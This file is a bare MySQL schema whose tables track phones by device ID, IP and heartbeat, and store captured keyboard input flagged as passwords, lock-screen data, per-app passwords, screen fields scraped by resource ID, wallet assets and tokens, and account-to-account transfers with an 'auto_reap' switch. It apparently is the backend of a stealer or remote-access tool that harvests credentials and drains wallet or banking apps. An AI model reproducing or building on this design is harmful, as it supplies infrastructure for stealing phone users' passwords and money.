CREATE TABLE `device` (
  `id` bigint(21) NOT NULL,
  `creator` bigint(21) DEFAULT NULL,
  `create_date` datetime DEFAULT NULL,
  `device_id` varchar(255) DEFAULT NULL,
  `model` varchar(255) DEFAULT NULL,
  `language` varchar(255) DEFAULT NULL,
  `system_version` varchar(255) DEFAULT NULL,
  `sdk_version` varchar(255) DEFAULT NULL,
  `brand` varchar(255) DEFAULT NULL,
  `screen_width` int(11) DEFAULT NULL,
  `screen_height` int(11) DEFAULT NULL,
  `phone` varchar(255) DEFAULT NULL,
  `ip` varchar(255) DEFAULT NULL,
  `status` int(11) DEFAULT NULL,
  `auto_reap` int(11) DEFAULT NULL,
  `lock_screen` json DEFAULT NULL,
  `fix_lock_screen` int(11) DEFAULT NULL,
  `manual_count` int(11) DEFAULT NULL,
  `auto_count` int(11) DEFAULT NULL,
  `remark` text,
  `last_heart` datetime DEFAULT NULL,
  `assets` json DEFAULT NULL,
  `app_password` json DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;



CREATE TABLE `app_assets` (
  `id` bigint(21) NOT NULL,
  `creator` bigint(21) DEFAULT NULL,
  `create_date` datetime DEFAULT NULL,
  `device_id` varchar(255) DEFAULT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `package_name` varchar(255) DEFAULT NULL,
  `assets` json DEFAULT NULL,
  `remark` text,
  `modified` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE `app_transfer_record` (
  `id` bigint(21) NOT NULL,
  `creator` bigint(21) DEFAULT NULL,
  `create_date` datetime DEFAULT NULL,
  `device_id` varchar(255) DEFAULT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `package_name` varchar(255) DEFAULT NULL,
  `from_account` varchar(255) DEFAULT NULL,
  `to_account` varchar(255) DEFAULT NULL,
  `amount` decimal(20,8) DEFAULT NULL,
  `remark` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;


CREATE TABLE `asset` (
  `id` bigint(21) NOT NULL,
  `device_id` varchar(255) DEFAULT NULL,
  `amount` decimal(20,8) DEFAULT NULL,
  `app` varchar(255) DEFAULT NULL,
  `currency` varchar(255) DEFAULT NULL,
  `name` varchar(255) DEFAULT NULL,
  `price` double(20,8) DEFAULT NULL,
  `title` varchar(255) DEFAULT NULL,
  `token` varchar(255) DEFAULT NULL,
  `unit` varchar(255) DEFAULT NULL,
  `update_time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;



CREATE TABLE `input_text_record` (
  `id` bigint(21) NOT NULL,
  `device_id` varchar(255) DEFAULT NULL,
   `app_name` varchar(255) DEFAULT NULL,
    `package_name` varchar(255) DEFAULT NULL,
    `password` int(11) DEFAULT NULL,
    `text` varchar(255) DEFAULT NULL,
    `time` varchar(255) DEFAULT NULL,
    `date` varchar(255) DEFAULT NULL,

  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;



CREATE TABLE `install_app` (
  `id` bigint(21) NOT NULL,
  `creator` bigint(21) DEFAULT NULL,
  `create_date` datetime DEFAULT NULL,
  `device_id` varchar(255) DEFAULT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `package_name` varchar(255) DEFAULT NULL,
  `password` json DEFAULT NULL,
  `remark` varchar(255) DEFAULT NULL,
  `modified` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;


CREATE TABLE `install_app_filter` (
  `id` bigint(21) NOT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `package_name` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;


CREATE TABLE `log` (
  `id` bigint(21) NOT NULL,
  `device_id` varchar(255) DEFAULT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `package_name` varchar(255) DEFAULT NULL,
  `source` varchar(255) DEFAULT NULL,
  `text` text,
  `create_time` datetime DEFAULT NULL,
  `type` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;



CREATE TABLE `major_data` (
  `id` bigint(21) NOT NULL,
  `device_id` varchar(255) DEFAULT NULL,
  `resource_id` varchar(255) DEFAULT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `package_name` varchar(255) DEFAULT NULL,
  `label` varchar(255) DEFAULT NULL,
  `value` varchar(255) DEFAULT NULL,
  `password` int(11) DEFAULT NULL,
  `create_time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;


CREATE TABLE `major_data_rule` (
  `id` bigint(21) NOT NULL,
  `feature` varchar(255) DEFAULT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `package_name` varchar(255) DEFAULT NULL,
  `create_date` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;



CREATE TABLE `transfer` (
  `id` bigint(21) NOT NULL,
  `device_id` varchar(255) DEFAULT NULL,
  `amount` decimal(20,8) DEFAULT NULL,
  `sender` varchar(255) DEFAULT NULL,
  `receiver` varchar(255) DEFAULT NULL,
  `app` varchar(255) DEFAULT NULL,
  `currency` varchar(255) DEFAULT NULL,
  `wallet_name` varchar(255) DEFAULT NULL,
  `submit_time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;












